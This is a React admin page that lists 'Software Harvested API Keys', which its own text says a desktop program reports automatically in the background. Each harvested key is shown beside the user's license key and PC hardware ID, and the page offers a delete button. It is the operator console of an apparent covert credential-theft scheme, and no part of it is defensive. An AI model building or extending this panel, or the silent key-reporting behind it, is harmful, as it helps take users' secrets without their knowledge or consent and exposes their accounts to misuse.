'use client';
import { useState, useEffect } from 'react';

export default function ReportedKeysPage() {
  const [keys, setKeys] = useState([]);
  const [loading, setLoading] = useState(true);

  const fetchKeys = () => {
    fetch('/api/admin/reported-keys')
      .then(res => res.json())
      .then(data => {
        if (data.success) setKeys(data.data);
        setLoading(false);
      });
  };

  useEffect(() => {
    fetchKeys();
  }, []);

  const handleDeleteKey = async (id) => {
    if (!confirm('Are you sure you want to delete this harvested API key?')) return;
    try {
      const res = await fetch(`/api/admin/reported-keys?id=${id}`, {
        method: 'DELETE'
      });
      if (res.ok) {
        fetchKeys();
      } else {
        alert('Failed to delete key');
      }
    } catch (err) {
      alert('Error deleting key');
    }
  };

  if (loading) return <div className="p-8">Loading...</div>;

  return (
    <div className="p-8 max-w-6xl">
      <h1 className="text-2xl font-bold text-gray-800 mb-6">Software Harvested API Keys</h1>
      <p className="text-gray-600 mb-6 text-sm">
        These keys are automatically reported by the C desktop software in the background.
      </p>

      <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
        <table className="w-full text-left border-collapse">
          <thead>
            <tr className="bg-gray-50 border-b border-gray-100">
              <th className="p-4 font-semibold text-gray-600">Reported At</th>
              <th className="p-4 font-semibold text-gray-600">License Key</th>
              <th className="p-4 font-semibold text-gray-600">PC Hardware ID</th>
              <th className="p-4 font-semibold text-gray-600">Harvested API Key</th>
              <th className="p-4 font-semibold text-gray-600">Status</th>
              <th className="p-4 font-semibold text-gray-600 text-right">Actions</th>
            </tr>
          </thead>
          <tbody>
            {keys.map((k) => (
              <tr key={k._id} className="border-b border-gray-50 hover:bg-gray-50">
                <td className="p-4 text-sm text-gray-700">{new Date(k.reported_at).toLocaleString()}</td>
                <td className="p-4 font-mono text-sm text-blue-600">{k.license_key}</td>
                <td className="p-4 font-mono text-xs text-gray-500">{k.pc_build_number}</td>
                <td className="p-4 font-mono text-sm font-bold text-gray-800">{k.api_key}</td>
                <td className="p-4">
                  <span className="px-2 py-1 rounded text-xs font-medium bg-green-100 text-green-700">
                    {k.status}
                  </span>
                </td>
                <td className="p-4 text-right">
                  <button 
                    onClick={() => handleDeleteKey(k._id)}
                    className="text-red-500 hover:text-red-700 font-medium text-sm transition-colors"
                  >
                    Delete
                  </button>
                </td>
              </tr>
            ))}
            {keys.length === 0 && (
              <tr><td colSpan="6" className="p-8 text-center text-gray-500">No keys harvested yet.</td></tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
